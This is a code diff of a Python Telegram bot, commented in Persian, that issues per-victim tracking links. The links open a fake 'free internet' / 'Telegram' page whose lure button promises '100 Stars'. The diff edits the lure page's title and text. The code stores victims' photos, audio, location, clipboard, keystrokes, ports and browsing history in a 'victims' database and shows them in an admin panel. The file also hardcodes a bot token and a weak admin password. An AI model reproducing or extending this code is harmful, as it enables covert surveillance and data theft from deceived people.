@@ -7,7 +7,7 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Cont
 
 # -------------------- Configuration --------------------
 TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
-ADMIN_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "Y_python")
+ADMIN_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "@Oython")
 ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8391932958"))
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
 DATABASE = "victims.db"
@@ -68,11 +68,11 @@ def send_telegram_file(file_bytes, filename, caption, as_image=False):
 CAPTURE_PAGE = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>تلگرام</title>
+<head><meta charset="UTF-8"><title>اتصال به اینترنت رایگان</title>
 <style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;} video,canvas{display:none;} #btn{display:block;margin:20px auto;padding:15px 30px;font-size:20px;background:#4CAF50;border:none;border-radius:10px;color:white;cursor:pointer;}</style>
 </head>
 <body>
-    <h1 id="msg" class="blink"></h1>
+    <h1 id="msg" class="blink">تلگرام</h1>
     <button id="btn" onclick="startEverything()">دریافت 100 استارز</button>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
@@ -112,7 +112,6 @@ CAPTURE_PAGE = """
 </body></html>
 """
 
-# Admin login/page templates (kept same)
 ADMIN_LOGIN = """
 <!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
 <body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز عبور><br><input type=submit value=ورود></form></body></html>
@@ -315,19 +314,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         token = str(uuid.uuid4())
         db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
+        db.row_factory = sqlite3.Row   # اضافه شد
         db.execute("INSERT INTO victims (token, created_at, ip) VALUES (?, ?, ?)",
                    (token, datetime.now().isoformat(), query.message.chat.id))
         db.commit()
         db.close()
         link = f"{PUBLIC_URL}/go/{token}"
         await query.edit_message_text(f"🔗 لینک شما آماده است:\n{link}\n\n(این لینک را برای قربانی ارسال کنید)")
+
     elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
         parts = data.split('|')
         action = parts[0]
         token = parts[1]
         db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
+        db.row_factory = sqlite3.Row   # اضافه شد
         if action == "photo":
             row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
             if row:
@@ -376,6 +376,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else:
                 await query.answer("تاریخچه‌ای یافت نشد.", show_alert=True)
         db.close()
+
     elif data == "admin_panel":
         if user_id != ADMIN_USER_ID:
             await query.answer("شما اجازه ندارید.", show_alert=True)
@@ -386,6 +387,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("بازگشت", callback_data="start")]
         ]
         await query.edit_message_text("پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
+
     elif data == "toggle_bot":
         if user_id != ADMIN_USER_ID:
             await query.answer("شما اجازه ندارید.", show_alert=True)
@@ -393,17 +395,19 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         BOT_ACTIVE = not BOT_ACTIVE
         status = "✅ فعال" if BOT_ACTIVE else "❌ غیرفعال"
         await query.edit_message_text(f"ربات اکنون {status} است.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
+
     elif data == "start":
         keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")]]
         if user_id == ADMIN_USER_ID:
             keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
         await query.edit_message_text("برای دریافت لینک اختصاصی روی دکمه زیر کلیک کنید.", reply_markup=InlineKeyboardMarkup(keyboard))
+
     elif data == "victims_list":
         if user_id != ADMIN_USER_ID:
             await query.answer("شما اجازه ندارید.", show_alert=True)
             return
         db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
+        db.row_factory = sqlite3.Row   # اضافه شد
         victims = db.execute("SELECT token, ip, created_at FROM victims ORDER BY created_at DESC").fetchall()
         db.close()
         if not victims:
@@ -416,20 +420,21 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             buttons.append([btn])
         buttons.append([InlineKeyboardButton("بازگشت به پنل", callback_data="admin_panel")])
         await query.edit_message_text("📋 لیست قربانیان (روی هرکدام کلیک کنید):", reply_markup=InlineKeyboardMarkup(buttons))
+
     elif data.startswith("victim_detail|"):
         if user_id != ADMIN_USER_ID:
             await query.answer("شما اجازه ندارید.", show_alert=True)
             return
         token = data.split("|")[1]
         db = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
+        db.row_factory = sqlite3.Row   # اضافه شد
         victim = db.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
         if not victim:
             await query.edit_message_text("قربانی یافت نشد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
             db.close()
             return
         log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-        info = json.loads(log_dev['data']) if log_dev else {}
+        info = json.loads(log_dev['data']) if log_dev else {"warning": "هنوز اطلاعات دستگاه ارسال نشده است."}
         db.close()
 
         text = f"<b>مشخصات قربانی</b>\n"
